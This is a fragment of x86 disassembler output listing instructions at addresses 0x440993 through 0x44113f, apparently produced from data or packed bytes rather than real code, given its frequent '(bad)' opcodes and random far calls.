  440993:	pop    ebp
  440994:	lods   al,BYTE PTR ds:[esi]
  440995:	(bad)  
  440996:	xor    BYTE PTR [ebx],dl
  440998:	mov    dl,0xc2
  44099a:	ficomp WORD PTR [eax-0x7a]
  44099d:	inc    ecx
  44099e:	pop    ds
  44099f:	mov    dl,dh
  4409a1:	or     esp,DWORD PTR [esi+0x54dd5c76]
  4409a7:	mov    cl,0x46
  4409a9:	xchg   ecx,eax
  4409aa:	call   0x1e4b:0x66b2c09d
  4409b1:	inc    ebp
  4409b2:	adc    ebx,ebp
  4409b4:	sar    DWORD PTR [edx+ebx*4-0x55],1
  4409b8:	shrd   esp,esi,0xd3
  4409bc:	in     eax,0xc
  4409be:	fs ret 
  4409c0:	mov    cl,0x8c
  4409c2:	lds    ebx,FWORD PTR gs:[ebx+0x67471455]
  4409c9:	shr    DWORD PTR [edi+eiz*4-0x25],1
  4409cd:	mov    esi,0x534966e4
  4409d2:	inc    esp
  4409d3:	hlt    
  4409d4:	mov    al,0x43
  4409d6:	dec    eax
  4409d7:	push   esi
  4409d8:	out    dx,al
  4409d9:	mov    ebp,0xfb2f831
  4409de:	sub    ah,dl
  4409e0:	mov    fs,ebx
  4409e2:	call   0x3ddb:0xe8b774fa
  4409e9:	add    DWORD PTR [ebp+0x19a095a5],ebx
  4409ef:	mov    fs,edi
  4409f1:	mov    ebp,0x4900211a
  4409f6:	pop    esp
  4409f7:	xor    eax,0xdd2bfeb7
  4409fc:	and    eax,0x92d91d67
  440a01:	and    dl,BYTE PTR [edx]
  440a03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  440a04:	sbb    bh,BYTE PTR [ebp+esi*1-0x59]
  440a08:	adc    al,BYTE PTR [edx+0x4df77261]
  440a0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  440a0f:	jle    0x4409c1
  440a11:	outs   dx,BYTE PTR ds:[esi]
  440a12:	lds    ecx,FWORD PTR [esi+0x2709f1d2]
  440a18:	adc    al,BYTE PTR [ebp+0xbef8dd5]
  440a1e:	sbb    esi,esi
  440a20:	adc    ch,BYTE PTR [ecx]
  440a22:	mov    ds,WORD PTR [eax-0x497ba3c8]
  440a28:	ins    DWORD PTR es:[edi],dx
  440a29:	loope  0x4409b0
  440a2b:	fdivrp st(2),st
  440a2d:	fmul   DWORD PTR [ebx]
  440a2f:	push   0xa7d61805
  440a34:	shl    ebp,cl
  440a36:	jp     0x440a7e
  440a38:	push   cs
  440a39:	xor    dh,dl
  440a3b:	std    
  440a3c:	mov    bl,0xbe
  440a3e:	(bad)  
  440a3f:	xchg   ebp,eax
  440a40:	cmp    DWORD PTR [ebp+0x5b82f2ef],0x6efcb51f
  440a4a:	jbe    0x4409f3
  440a4c:	xchg   esp,eax
  440a4d:	adc    BYTE PTR [esi-0x7f],dl
  440a50:	xchg   ebp,eax
  440a51:	pop    ebp
  440a52:	call   0x6c7c:0x2e014c12
  440a59:	sahf   
  440a5a:	ins    BYTE PTR es:[edi],dx
  440a5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  440a5c:	inc    eax
  440a5d:	out    dx,al
  440a5e:	dec    ecx
  440a5f:	mov    eax,0x3950dd72
  440a64:	mov    dl,0x98
  440a66:	xchg   ebp,eax
  440a67:	mov    BYTE PTR [ecx],0xab
  440a6a:	xchg   esi,eax
  440a6b:	jae    0x440a15
  440a6d:	or     ebp,DWORD PTR [ebx]
  440a6f:	push   ds
  440a70:	ins    DWORD PTR es:[edi],dx
  440a71:	nop
  440a72:	jnp    0x440aa0
  440a74:	push   edx
  440a75:	sbb    BYTE PTR [ebp+0x50beb69c],bl
  440a7b:	or     dl,BYTE PTR [edx]
  440a7d:	xor    edx,DWORD PTR [edx]
  440a7f:	sbb    ebx,DWORD PTR [edi+0x24851704]
  440a85:	mov    bh,dl
  440a87:	shl    ah,cl
  440a89:	fsub   st(2),st
  440a8b:	bound  esi,QWORD PTR [edx+0x79cc385c]
  440a91:	aas    
  440a92:	cmp    edi,edi
  440a94:	lods   eax,DWORD PTR ds:[esi]
  440a95:	add    eax,0xbf4c6123
  440a9a:	icebp  
  440a9b:	hlt    
  440a9c:	mov    dl,0x37
  440a9e:	inc    esp
  440a9f:	sbb    ecx,ebp
  440aa1:	sub    bl,BYTE PTR [ebp+0x210430e1]
  440aa7:	arpl   sp,bp
  440aa9:	jmp    0x440ad7
  440aab:	out    0x89,eax
  440aad:	das    
  440aae:	push   es
  440aaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  440ab0:	in     eax,0x70
  440ab2:	rol    DWORD PTR [ebp-0x4ef6a424],0xb2
  440ab9:	inc    ebp
  440aba:	mov    al,ds:0x31a16c4d
  440abf:	imul   ecx,DWORD PTR ds:[edx],0xffffff90
  440ac3:	sub    BYTE PTR [edi],dl
  440ac5:	push   edi
  440ac6:	sbb    al,0x62
  440ac8:	mov    ds:0xae76e0cf,eax
  440acd:	pop    edx
  440ace:	push   ds
  440acf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  440ad0:	mov    WORD PTR [ebx],cs
  440ad2:	pop    ebx
  440ad3:	test   DWORD PTR gs:[ecx+0xba72868],esi
  440ada:	pop    esi
  440adb:	inc    ecx
  440adc:	pop    sp
  440ade:	sub    DWORD PTR [edi],0xfffffffa
  440ae1:	sbb    DWORD PTR [edx+0x637ab8e0],0xbab4c2d1
  440aeb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  440aec:	fld    TBYTE PTR [esi]
  440aee:	jns    0x440adb
  440af0:	jmp    0xb2c315f7
  440af5:	mov    esp,0xca33b178
  440afa:	sbb    al,0x67
  440afc:	lods   eax,DWORD PTR ds:[esi]
  440afd:	aaa    
  440afe:	lock cmp eax,0x9a8e0932
  440b04:	cmp    edi,esi
  440b06:	(bad)  
  440b08:	shr    BYTE PTR [edx+0x2a5c079d],0x40
  440b0f:	push   esp
  440b10:	inc    eax
  440b11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  440b12:	jge    0x440b05
  440b14:	sub    al,0xb
  440b16:	mov    ds:0xc1466969,eax
  440b1b:	jecxz  0x440acf
  440b1d:	sub    BYTE PTR [eax],cl
  440b1f:	or     DWORD PTR [edi+0x24626103],edi
  440b25:	add    al,0x12
  440b27:	jne    0x440b30
  440b29:	call   FWORD PTR [ebx+0x21]
  440b2c:	push   ebx
  440b2d:	aam    0x81
  440b2f:	xchg   DWORD PTR [esp+ebp*1],esp
  440b32:	mov    ebx,esi
  440b34:	sub    DWORD PTR [edx-0x66],esi
  440b37:	or     DWORD PTR [eax],ebx
  440b39:	stc    
  440b3a:	int    0xb0
  440b3c:	pop    edx
  440b3d:	or     ecx,DWORD PTR [esi+0x10]
  440b40:	mov    WORD PTR [edx+0x14],ss
  440b43:	dec    esi
  440b44:	xchg   esp,eax
  440b45:	sbb    DWORD PTR [ebx-0x5189a137],0x626ea691
  440b4f:	and    al,0x6f
  440b51:	or     eax,DWORD PTR [esi-0x77c85e32]
  440b57:	js     0x440bc3
  440b59:	fwait
  440b5a:	xchg   ebp,eax
  440b5b:	mov    al,BYTE PTR [ebp+0x32a7bfc2]
  440b61:	in     eax,dx
  440b62:	into   
  440b63:	xchg   edi,eax
  440b64:	dec    DWORD PTR [ebx]
  440b66:	adc    al,0xe3
  440b68:	int    0x6
  440b6a:	dec    edi
  440b6b:	int    0x98
  440b6d:	inc    ebx
  440b6e:	jbe    0x440bdf
  440b70:	mov    bh,0xee
  440b72:	rol    ebp,1
  440b74:	sub    esp,DWORD PTR [ebx]
  440b76:	pop    edx
  440b77:	push   eax
  440b78:	mov    BYTE PTR [ecx],dl
  440b7a:	dec    ecx
  440b7b:	test   eax,0x8e8d36f3
  440b80:	push   edx
  440b81:	pop    ds
  440b82:	jl     0x440b26
  440b84:	call   0xbfdf9438
  440b89:	mov    bl,0x85
  440b8b:	data16 mov dl,0xb5
  440b8e:	add    edi,eax
  440b90:	clc    
  440b91:	mov    BYTE PTR [edi-0x54],cl
  440b94:	inc    edx
  440b95:	dec    edi
  440b96:	pop    edi
  440b97:	add    eax,0x9e7af0b3
  440b9c:	retf   0xbdef
  440b9f:	cmc    
  440ba0:	mov    dl,0x1b
  440ba2:	mov    bl,0x9
  440ba4:	xor    BYTE PTR [esi+0xd],ah
  440ba7:	jecxz  0x440b87
  440ba9:	or     esp,DWORD PTR [ebp-0x11]
  440bac:	daa    
  440bad:	mov    WORD PTR [ebp+esi*2+0xb9ad85b],es
  440bb4:	mov    edx,?
  440bb6:	push   ebx
  440bb7:	cmp    DWORD PTR [ecx+0x2],edx
  440bba:	adc    ah,BYTE PTR [edi-0x6248af71]
  440bc0:	sub    BYTE PTR [edi+0x3cb05bf7],bh
  440bc6:	(bad)  
  440bc7:	or     bl,BYTE PTR [edx+0x4446759e]
  440bcd:	ror    BYTE PTR [ebp+0x77],0x57
  440bd1:	add    cl,BYTE PTR [ecx+0x1306b1a7]
  440bd7:	stc    
  440bd8:	dec    ecx
  440bd9:	jmp    FWORD PTR [ecx-0x1b]
  440bdc:	mov    dl,0x2c
  440bde:	and    al,0xfe
  440be0:	xchg   ebx,eax
  440be1:	fs scas al,BYTE PTR es:[edi]
  440be3:	adc    eax,DWORD PTR ds:0xa21e9e09
  440be9:	scas   al,BYTE PTR es:[edi]
  440bea:	scas   eax,DWORD PTR es:[edi]
  440beb:	dec    ecx
  440bec:	repnz arpl bp,cx
  440bef:	mov    ebp,0x44ed87b1
  440bf4:	ret    0xde81
  440bf7:	ss das 
  440bf9:	in     al,dx
  440bfa:	push   edx
  440bfb:	fs push es
  440bfd:	push   ss
  440bfe:	push   ebp
  440bff:	pushf  
  440c00:	daa    
  440c01:	dec    ebx
  440c02:	stos   BYTE PTR es:[edi],al
  440c03:	(bad)  
  440c05:	mov    cl,0x6a
  440c07:	sbb    dh,BYTE PTR [edx-0x5cc798bf]
  440c0d:	inc    esp
  440c0e:	adc    eax,0xef041e99
  440c13:	pop    ds
  440c14:	imul   edx,DWORD PTR [ebx-0x64ed2a2b],0x58
  440c1b:	xchg   ebp,eax
  440c1c:	xor    esi,eax
  440c1e:	call   0xe7c3:0x4272bcb
  440c25:	adc    DWORD PTR [eax],esi
  440c27:	mov    ecx,0x2744713f
  440c2c:	ret    0x8c65
  440c2f:	cmp    dl,dl
  440c31:	pusha  
  440c32:	fwait
  440c33:	pop    ss
  440c34:	rol    DWORD PTR [ecx-0x12],cl
  440c37:	daa    
  440c38:	xor    al,0xb4
  440c3a:	jle    0x440c96
  440c3c:	lea    esi,[edx+ebp*2-0x59]
  440c40:	jle    0x440bfa
  440c42:	fnstenv [esi-0x29db9a60]
  440c48:	mov    dl,0xac
  440c4a:	sub    BYTE PTR [ecx+0x1f],dh
  440c4d:	iret   
  440c4e:	xchg   edi,eax
  440c4f:	mov    esp,0xb9b6e99a
  440c54:	push   ecx
  440c55:	sbb    ebp,DWORD PTR [ebp-0x59]
  440c58:	fld    QWORD PTR [eax]
  440c5a:	ror    BYTE PTR [eax-0x7],0x67
  440c5e:	call   0x7e9d:0xa1ac036c
  440c65:	jo     0x440c44
  440c67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  440c68:	xor    ah,BYTE PTR [ebx]
  440c6a:	push   edi
  440c6b:	test   al,0x3c
  440c6d:	mov    ch,BYTE PTR [ecx-0x4b7070cd]
  440c73:	daa    
  440c74:	bound  edx,QWORD PTR [edi]
  440c76:	(bad)  
  440c77:	(bad)  
  440c79:	mov    edi,DWORD PTR [eax]
  440c7b:	test   al,0x39
  440c7d:	cld    
  440c7e:	hlt    
  440c7f:	in     eax,dx
  440c80:	adc    bl,ch
  440c82:	mov    ebp,0xe781eb8b
  440c87:	pop    edx
  440c88:	mov    dh,0x2d
  440c8a:	mov    ch,0xf3
  440c8c:	jl     0x440c8f
  440c8e:	pop    edx
  440c8f:	popf   
  440c90:	xchg   DWORD PTR [ecx+0x3b06a749],edi
  440c96:	mov    ebp,edx
  440c98:	clc    
  440c99:	repnz push edi
  440c9b:	or     DWORD PTR [ebp+0x2e32214d],ebp
  440ca1:	mov    cl,0x1a
  440ca3:	inc    eax
  440ca4:	leave  
  440ca5:	sti    
  440ca6:	sub    al,0x14
  440ca8:	sahf   
  440ca9:	or     edx,DWORD PTR [eax]
  440cab:	inc    ecx
  440cac:	aam    0x2a
  440cae:	sbb    al,0xfb
  440cb0:	inc    ebp
  440cb1:	push   ss
  440cb2:	call   0x89d1:0x9f7b29a4
  440cb9:	adc    al,0xe5
  440cbb:	test   al,0x5b
  440cbd:	jns    0x440ce7
  440cbf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  440cc0:	adc    DWORD PTR [esi],ebp
  440cc2:	jp     0x440cce
  440cc4:	jb     0x440c66
  440cc6:	outs   dx,DWORD PTR ds:[esi]
  440cc7:	dec    ebx
  440cc8:	scas   al,BYTE PTR es:[edi]
  440cc9:	push   eax
  440cca:	and    eax,0x952cb2e5
  440ccf:	into   
  440cd0:	test   eax,0xc9a633d1
  440cd5:	mov    al,0x48
  440cd7:	adc    BYTE PTR [ebx-0x7898a00a],0x42
  440cde:	call   0xb8e:0x790d7c15
  440ce5:	fisttp DWORD PTR [edi+eiz*4]
  440ce8:	popf   
  440ce9:	add    bl,cl
  440ceb:	scas   al,BYTE PTR es:[edi]
  440cec:	mov    edx,?
  440cee:	out    0xfe,al
  440cf0:	mov    dl,0x4f
  440cf2:	sbb    eax,0x24bd8aaf
  440cf7:	in     al,0x30
  440cf9:	or     ebx,ebp
  440cfb:	int3   
  440cfc:	rol    edx,cl
  440cfe:	mov    gs,WORD PTR [eiz*4-0x3cf665ec]
  440d05:	aaa    
  440d06:	cmp    DWORD PTR [esi+0x15],ecx
  440d09:	xchg   ebp,eax
  440d0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  440d0c:	outs   dx,BYTE PTR ds:[esi]
  440d0d:	mov    WORD PTR [bx+si+0x5ff1],gs
  440d12:	test   eax,0x9ac12afc
  440d17:	and    DWORD PTR [ebx],edi
  440d19:	mov    ah,0x4a
  440d1b:	paddq  mm7,QWORD PTR [edx+eax*1]
  440d1f:	mov    al,ds:0xece5d547
  440d24:	cwde   
  440d25:	mov    ecx,ds
  440d27:	aaa    
  440d28:	sti    
  440d29:	inc    ebp
  440d2a:	inc    edx
  440d2b:	data16 (bad) 
  440d2d:	fcmovnbe st,st(6)
  440d2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  440d30:	mov    esp,esp
  440d32:	mov    bl,dh
  440d34:	dec    ebx
  440d35:	mov    edx,0xe640a7af
  440d3a:	inc    ecx
  440d3b:	sbb    al,0x2b
  440d3d:	shl    esi,0xe3
  440d40:	(bad)  
  440d41:	jle    0x440ce0
  440d43:	dec    esi
  440d44:	and    eax,0xc2167afe
  440d49:	pop    ecx
  440d4a:	mov    dh,0x2e
  440d4c:	int3   
  440d4d:	add    eax,0xdfac3aa7
  440d52:	fidivr DWORD PTR [ebx-0x17]
  440d55:	inc    edx
  440d56:	dec    ebp
  440d57:	stc    
  440d58:	mov    esp,0xbb5599bd
  440d5d:	retf   
  440d5e:	ror    ecx,1
  440d60:	out    0xaa,al
  440d62:	sbb    edi,edi
  440d64:	or     al,0x8e
  440d66:	call   0x72f4:0xad55d6d
  440d6d:	sub    eax,0xa91faa1
  440d72:	fstp   DWORD PTR [edx]
  440d74:	mov    edx,0x49c02251
  440d79:	sar    BYTE PTR [edx+0x3da44ea3],cl
  440d7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  440d80:	imul   esp,edx,0xa7edd2db
  440d86:	xor    BYTE PTR [ecx],ah
  440d88:	lea    esp,[esi+edi*2-0x59]
  440d8c:	inc    edx
  440d8d:	aas    
  440d8e:	push   ebx
  440d8f:	dec    ecx
  440d90:	sbb    ebx,ebp
  440d92:	cmp    eax,0x9b553f9d
  440d97:	lea    esp,[eax+0x3c]
  440d9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  440d9b:	or     eax,0x39ffdf33
  440da0:	mov    dl,0x59
  440da2:	or     eax,0xfaf2912
  440da7:	in     al,dx
  440da8:	fisttp WORD PTR [ebx]
  440daa:	mov    al,0x62
  440dac:	repz fs adc eax,esi
  440db0:	inc    ebx
  440db1:	ret    0xc99
  440db4:	dec    ecx
  440db5:	fistp  DWORD PTR [edx+0x3c]
  440db8:	mov    gs,ebx
  440dba:	in     eax,dx
  440dbb:	sbb    cl,dl
  440dbd:	xor    ecx,eax
  440dbf:	adc    esi,DWORD PTR [edx+0x6f3279f4]
  440dc5:	sub    ebx,DWORD PTR ds:0xdef0b01c
  440dcb:	inc    edi
  440dcc:	outs   dx,BYTE PTR ds:[esi]
  440dcd:	jo     0x440da0
  440dcf:	pop    eax
  440dd0:	repnz dec esi
  440dd2:	std    
  440dd3:	xchg   esi,eax
  440dd4:	mov    dl,0x42
  440dd6:	xor    ebp,DWORD PTR [di-0x2a]
  440dda:	pop    ecx
  440ddb:	inc    ebp
  440ddc:	mov    ch,0x8
  440dde:	repnz dec esi
  440de0:	mov    ds:0x4275b16f,eax
  440de5:	or     DWORD PTR [edi+0x7d9bb269],eax
  440deb:	add    ch,0x6c
  440dee:	dec    ecx
  440def:	lea    eax,[ebp+0xb]
  440df2:	jl     0x440df1
  440df4:	mov    ecx,0x30f5e469
  440df9:	dec    edi
  440dfa:	call   0x7ed2:0x35c50452
  440e01:	fucomip st,st(3)
  440e03:	lods   eax,DWORD PTR ds:[esi]
  440e04:	jp     0x440dfc
  440e06:	cmc    
  440e07:	in     al,0x68
  440e09:	or     esi,DWORD PTR [eax+0x21]
  440e0c:	rcl    BYTE PTR [ebx+ebx*4+0x4118b2e7],0x8c
  440e14:	xor    cl,bl
  440e16:	xor    bh,dl
  440e18:	out    0xb,al
  440e1a:	sub    edx,ebx
  440e1c:	xlat   BYTE PTR ds:[ebx]
  440e1d:	test   edi,ecx
  440e1f:	shr    BYTE PTR [edx-0x6295662f],1
  440e25:	ffreep st(4)
  440e27:	dec    ebx
  440e28:	cmc    
  440e29:	xchg   ebx,eax
  440e2a:	lods   al,BYTE PTR ds:[esi]
  440e2b:	test   DWORD PTR ss:[ebx],0x879f284b
  440e32:	ret    
  440e33:	in     eax,0xa3
  440e35:	imul   ebx,DWORD PTR [edx+0x343685b7],0x9d9ae904
  440e3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  440e40:	xchg   si,ax
  440e42:	ins    DWORD PTR es:[edi],dx
  440e43:	pop    edi
  440e44:	cwde   
  440e45:	xchg   edi,eax
  440e46:	mov    ebx,0xf35bb25c
  440e4b:	(bad)  
  440e4c:	mov    eax,ds:0xe75935d5
  440e51:	or     eax,DWORD PTR [ebp+0x5e5f394f]
  440e57:	dec    ebp
  440e58:	daa    
  440e59:	outs   dx,DWORD PTR ds:[esi]
  440e5a:	call   0x9984:0xe48b4d13
  440e61:	aam    0xab
  440e63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  440e64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  440e65:	xor    DWORD PTR [ebp-0x7],0xd
  440e69:	jnp    0x440e77
  440e6b:	sub    DWORD PTR [ecx+esi*2+0x6b04c69d],edi
  440e72:	sub    eax,0xe
  440e75:	dec    ebx
  440e76:	pop    eax
  440e77:	mov    ecx,0x9ca7478d
  440e7c:	xor    eax,0x75131c0f
  440e81:	jmp    0x440e96
  440e83:	test   al,0x63
  440e85:	(bad)  
  440e86:	call   0xc8f8:0x699ec53d
  440e8d:	and    DWORD PTR [edx-0x59],ebp
  440e90:	fwait
  440e91:	retf   
  440e92:	sub    dl,BYTE PTR [esi+0x6065a955]
  440e98:	mov    dh,0xf7
  440e9a:	(bad)  
  440e9b:	jne    0x440e5b
  440e9d:	jg     0x440ef9
  440e9f:	push   eax
  440ea0:	mov    DWORD PTR [ebx+0x4f43a4f2],esi
  440ea6:	or     DWORD PTR [edi-0x29],esi
  440ea9:	std    
  440eaa:	or     dh,BYTE PTR ds:0xf695c4ee
  440eb0:	sub    DWORD PTR fs:[ecx],0xffffffc8
  440eb4:	loop   0x440ee1
  440eb6:	cmp    al,0xbb
  440eb8:	jl     0x440f1f
  440eba:	test   BYTE PTR [edi+0x4dababc5],ah
  440ec0:	fmul   DWORD PTR [edx+0x1b2fee8]
  440ec6:	push   ds
  440ec7:	push   0x6302cb77
  440ecc:	stos   BYTE PTR es:[edi],al
  440ecd:	or     eax,edi
  440ecf:	jb     0x440f09
  440ed1:	push   0x33556062
  440ed6:	call   0x29fc:0x57f0976d
  440edd:	xchg   ebp,eax
  440ede:	inc    esp
  440edf:	mov    ds:0xdc07b0c4,al
  440ee4:	test   ebx,0xb28a5298
  440eea:	call   0x229e:0x47c272c9
  440ef1:	pop    esi
  440ef2:	cmp    ah,BYTE PTR [edi+0x27a5a481]
  440ef8:	jbe    0x440e9b
  440efa:	retf   
  440efb:	pop    ebx
  440efc:	mov    dl,0xe2
  440efe:	js     0x440f1c
  440f00:	mov    cl,0x26
  440f02:	jge    0x440f31
  440f04:	or     esp,DWORD PTR cs:[edx]
  440f07:	les    eax,FWORD PTR [esi]
  440f09:	add    DWORD PTR [ecx-0x65e68745],esi
  440f0f:	aam    0x65
  440f11:	imul   BYTE PTR ss:[edx]
  440f14:	jmp    0x440ee8
  440f16:	xor    al,0x9d
  440f18:	ins    BYTE PTR es:[edi],dx
  440f19:	push   ebx
  440f1a:	call   0xc4ab:0x9ff535e2
  440f21:	jmp    0x440ebd
  440f23:	mov    ebx,0x9c4b65b0
  440f28:	inc    eax
  440f29:	adc    BYTE PTR [edx+0x750b10da],bh
  440f2f:	std    
  440f30:	clc    
  440f31:	or     dl,ch
  440f33:	mov    bh,0x11
  440f35:	sbb    DWORD PTR [edx+0x56807966],0x3c
  440f3c:	fwait
  440f3d:	mov    ah,bh
  440f3f:	sti    
  440f40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  440f41:	mov    dh,0x9d
  440f43:	retf   0x3b7a
  440f46:	sub    ebx,DWORD PTR [ecx-0x72d3f4b3]
  440f4c:	jb     0x440f2a
  440f4e:	mov    BYTE PTR [esi],dh
  440f50:	mov    dl,0x38
  440f52:	add    al,BYTE PTR [esp+edx*4]
  440f55:	mov    cl,0xc2
  440f57:	leave  
  440f58:	sbb    esi,DWORD PTR [esi+0x35]
  440f5b:	lods   al,BYTE PTR ds:[esi]
  440f5c:	or     dh,BYTE PTR [ebx]
  440f5e:	popa   
  440f5f:	idiv   BYTE PTR ds:0xf42cdaea
  440f65:	rcl    DWORD PTR [esi],1
  440f67:	test   eax,0xc8bcc8ad
  440f6c:	jb     0x440fec
  440f6e:	jg     0x440f07
  440f70:	push   es
  440f71:	mov    edi,DWORD PTR [edx+0x2a5328a7]
  440f77:	cmp    edi,DWORD PTR [ebx]
  440f79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  440f7a:	pop    ebx
  440f7b:	nop
  440f7c:	mov    dl,0x2d
  440f7e:	sbb    esi,ebx
  440f80:	(bad)  
  440f81:	mov    al,ds:0xbb3f343
  440f86:	or     BYTE PTR [ebx+0x5bd4498a],ch
  440f8c:	lahf   
  440f8d:	shl    dh,0x3a
  440f90:	mov    dl,0x46
  440f92:	jae    0x440fb7
  440f94:	sbb    al,0x9f
  440f96:	fistp  WORD PTR [edx+0x29]
  440f99:	or     edx,DWORD PTR [edx-0xa]
  440f9c:	sbb    dl,ch
  440f9e:	and    al,0xaf
  440fa0:	dec    ebp
  440fa1:	lds    esp,FWORD PTR [ebx+0xb0b4ab9]
  440fa7:	add    eax,0x4fe439db
  440fac:	pop    ebx
  440fad:	or     esp,eax
  440faf:	jp     0x440fcb
  440fb1:	shl    DWORD PTR [edi+0x40],1
  440fb4:	lock aam 0x9a
  440fb7:	aaa    
  440fb8:	xchg   ebx,eax
  440fb9:	mov    bh,dh
  440fbb:	mov    dl,0x48
  440fbd:	pushf  
  440fbe:	jmp    DWORD PTR [edi+0x349e3bb9]
  440fc4:	sub    DWORD PTR ds:0xe9b272d1,ecx
  440fca:	or     dh,BYTE PTR [edi-0x26]
  440fcd:	and    eax,0xad0a95d
  440fd2:	mov    DWORD PTR [edi],ecx
  440fd4:	xlat   BYTE PTR ds:[ebx]
  440fd5:	or     al,0x6
  440fd7:	dec    ebx
  440fd8:	xor    bh,ch
  440fda:	adc    ebp,ebp
  440fdc:	out    dx,al
  440fdd:	ins    DWORD PTR es:[edi],dx
  440fde:	add    al,0xa7
  440fe0:	adc    bh,dl
  440fe2:	and    DWORD PTR [ebx],ebp
  440fe4:	cmp    BYTE PTR [ebp-0x74],0xa7
  440fe8:	mov    eax,ds:0x9d843e01
  440fed:	pop    ss
  440fee:	outs   dx,BYTE PTR ds:[esi]
  440fef:	inc    eax
  440ff0:	into   
  440ff1:	add    dl,dl
  440ff3:	jecxz  0x441008
  440ff5:	or     edi,DWORD PTR [edi+0x4e0710]
  440ffb:	xor    eax,0x48f80b09
  441000:	push   ecx
  441001:	xor    eax,0x274a9c7
  441006:	fwait
  441007:	inc    edx
  441008:	dec    esi
  441009:	push   eax
  44100a:	adc    eax,0xbac67b9e
  44100f:	fsub   st(0),st
  441011:	or     esi,ebp
  441013:	mov    ds:0x916a17c7,eax
  441018:	(bad)  
  441019:	call   0xa9fc4b8
  44101e:	inc    esi
  44101f:	mov    ecx,0x9c6901a8
  441024:	repz push 0xffffff9a
  441027:	mov    eax,0xda242d76
  44102c:	les    ecx,FWORD PTR [ecx]
  44102e:	cdq    
  44102f:	aaa    
  441030:	nop
  441031:	mov    ah,BYTE PTR [ebx-0x6234675c]
  441037:	dec    ecx
  441038:	xchg   edx,eax
  441039:	or     BYTE PTR [esi],al
  44103b:	mov    esi,0x343a8f35
  441040:	push   ebp
  441041:	imul   esp,DWORD PTR [eax],0xa
  441044:	popa   
  441045:	fwait
  441046:	jb     0x4410c3
  441048:	mov    dl,0xea
  44104a:	not    BYTE PTR [ecx+0x67]
  44104d:	jecxz  0x4410c0
  44104f:	out    0x2d,eax
  441051:	or     BYTE PTR [ebp+edx*2+0x21],al
  441055:	sbb    BYTE PTR gs:[esi],ah
  441058:	and    dl,BYTE PTR ds:0x54b22875
  44105e:	cdq    
  44105f:	jbe    0x4410a8
  441061:	pop    ecx
  441062:	stos   BYTE PTR es:[edi],al
  441063:	cs stos BYTE PTR es:[edi],al
  441065:	or     esi,DWORD PTR [eax-0x1544b34d]
  44106b:	dec    edx
  44106c:	and    al,0xef
  44106e:	call   0x146e:0x2dae2db7
  441075:	fisttp DWORD PTR [esp+eiz*4-0x62]
  441079:	adc    edx,ebp
  44107b:	jge    0x4410c8
  44107d:	dec    esp
  44107e:	and    ah,cl
  441080:	ins    DWORD PTR es:[edi],dx
  441081:	sbb    DWORD PTR [edx-0x13d5745],0xccc7f685
  44108b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44108c:	sub    eax,0x4b34ce9b
  441091:	xor    DWORD PTR [ebp+esi*1+0x2],edx
  441095:	repz call 0xaed1:0x252b4ad7
  44109d:	adc    eax,0x2c28b44c
  4410a2:	inc    esp
  4410a3:	push   edi
  4410a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4410a5:	arpl   WORD PTR [ebx+0x3765b4e6],bx
  4410ab:	ficomp WORD PTR [ecx]
  4410ad:	ins    BYTE PTR es:[edi],dx
  4410ae:	outs   dx,BYTE PTR ds:[esi]
  4410af:	cmp    cl,BYTE PTR [edx]
  4410b1:	push   ss
  4410b2:	adc    al,0xf1
  4410b4:	inc    eax
  4410b5:	mov    ebx,edx
  4410b7:	call   0xceb2:0xb0af6624
  4410be:	mov    edi,0x3b8c25bb
  4410c3:	aam    0xa9
  4410c5:	or     edx,edi
  4410c7:	test   BYTE PTR [eax],ch
  4410c9:	jecxz  0x4410b7
  4410cb:	mov    edx,0x4b991dd6
  4410d0:	mov    bl,0x71
  4410d2:	cs (bad) 
  4410d4:	sti    
  4410d5:	fwait
  4410d6:	jns    0x441156
  4410d8:	pop    ecx
  4410d9:	pop    ss
  4410da:	add    BYTE PTR [ebp-0xc5034b9],0xab
  4410e1:	sti    
  4410e2:	xchg   ecx,eax
  4410e3:	or     BYTE PTR [ebp+0x75f2b3f],bh
  4410e9:	stos   BYTE PTR es:[edi],al
  4410ea:	int    0xeb
  4410ec:	mov    ch,ah
  4410ee:	inc    edi
  4410ef:	bound  ax,DWORD PTR [esp+eax*8-0x42e4c55b]
  4410f7:	sbb    eax,0x3daaa0d
  4410fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4410fd:	pop    ds
  4410fe:	mov    eax,?
  441100:	cdq    
  441101:	dec    edx
  441102:	call   0x4425:0xa99d3623
  441109:	or     edx,ecx
  44110b:	int3   
  44110c:	clc    
  44110d:	hlt    
  44110e:	pushf  
  44110f:	jns    0x4410cb
  441111:	shl    cl,cl
  441113:	xchg   edx,eax
  441114:	mov    dl,0x1b
  441116:	pusha  
  441117:	loope  0x44110a
  441119:	jl     0x441135
  44111b:	enter  0x25d6,0x30
  44111f:	add    DWORD PTR [ebx+0xb],ebp
  441122:	arpl   WORD PTR [eax+ecx*4-0x4de766a6],ax
  441129:	pop    edi
  44112a:	es push ecx
  44112c:	lods   eax,DWORD PTR ds:[esi]
  44112d:	in     eax,dx
  44112e:	ins    DWORD PTR es:[edi],dx
  44112f:	retf   
  441130:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  441131:	or     eax,DWORD PTR [edx-0x4cf1c6ef]
  441137:	mov    ch,0x3a
  441139:	lea    ebx,[edx+0x7e9962a8]
  44113f:	ror    esi,cl
